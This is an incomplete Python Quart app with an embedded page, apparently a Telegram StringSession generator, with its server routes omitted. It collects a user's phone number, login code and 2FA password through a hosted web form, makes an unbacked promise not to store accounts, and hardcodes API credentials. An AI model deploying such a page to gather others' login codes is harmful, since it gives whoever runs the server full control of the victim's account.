import os
from quart import Quart, render_template_string, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

app = Quart(__name__)

API_ID = int(os.environ.get("API_ID", 23483842))
API_HASH = os.environ.get("API_HASH", "63f3942db5bb0bd6ab36352ca52e773b")

user_sessions = {}

HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Gateway</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
        .card { background: #fff; width: 100%; max-width: 450px; padding: 30px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); }
        .note { background: #e7f3ff; padding: 15px; border-radius: 10px; font-size: 13px; color: #0d47a1; margin-bottom: 20px; border: 1px solid #bbdefb; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #2481cc; color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
        .res-section { margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 10px; border: 1px solid #e0e0e0; }
        .label { font-size: 12px; color: #666; margin-bottom: 4px; font-weight: bold; }
        .val { font-family: monospace; background: #eee; padding: 8px; border-radius: 5px; word-break: break-all; margin-bottom: 15px; }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="card">
    <h2>Telegram Session Gateway</h2>
    <div class="note">
        <strong>Important:</strong> This tool generates a StringSession for your private use. We do not store or monitor your account. Use the credentials below to authorize your bots.
    </div>
    
    <div id="step-1"><input type="text" id="phone" placeholder="+91XXXXXXXXXX"><button onclick="sendPhone()">Send Code</button></div>
    <div id="step-2" class="hidden"><input type="text" id="otp" placeholder="Enter Code"><button onclick="sendOtp()">Generate</button></div>
    <div id="step-2fa" class="hidden"><input type="password" id="password" placeholder="2FA Password"><button onclick="sendPassword()">Submit</button></div>
    
    <div id="step-success" class="hidden">
        <div class="res-section">
            <div class="label">API ID</div><div class="val" id="res-apiid"></div>
            <div class="label">API HASH</div><div class="val" id="res-apihash"></div>
            <div class="label">STRING SESSION</div><div class="val" id="res-session"></div>
        </div>
        <button onclick="location.reload()">Reset</button>
    </div>
    <div id="error-msg" style="color:red; margin-top:10px; text-align:center;"></div>
</div>
<script>
let currentPhone = "";
async function callApi(route, data) {
    const res = await fetch(route, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)});
    return await res.json();
}
async function sendPhone() {
    currentPhone = document.getElementById("phone").value;
    const res = await callApi("/submit_phone", {phone: currentPhone});
    if(res.status==="ok") { document.getElementById("step-1").classList.add("hidden"); document.getElementById("step-2").classList.remove("hidden"); }
    else { document.getElementById("error-msg").innerText = res.message; }
}
async function sendOtp() {
    const res = await callApi("/submit_otp", {phone: currentPhone, code: document.getElementById("otp").value});
    if(res.status==="ok") showRes(res);
    else if(res.status==="2fa_needed") { document.getElementById("step-2").classList.add("hidden"); document.getElementById("step-2fa").classList.remove("hidden"); }
    else document.getElementById("error-msg").innerText = res.message;
}
async function sendPassword() {
    const res = await callApi("/submit_password", {phone: currentPhone, password: document.getElementById("password").value});
    if(res.status==="ok") showRes(res);
    else document.getElementById("error-msg").innerText = res.message;
}
function showRes(res) {
    document.getElementById("step-2").classList.add("hidden"); document.getElementById("step-2fa").classList.add("hidden");
    document.getElementById("step-success").classList.remove("hidden");
    document.getElementById("res-apiid").innerText = res.api_id;
    document.getElementById("res-apihash").innerText = res.api_hash;
    document.getElementById("res-session").innerText = res.session;
}
</script>
</body>
</html>
"""

# ... (Routes remain same as previous step, returning API_ID and API_HASH)
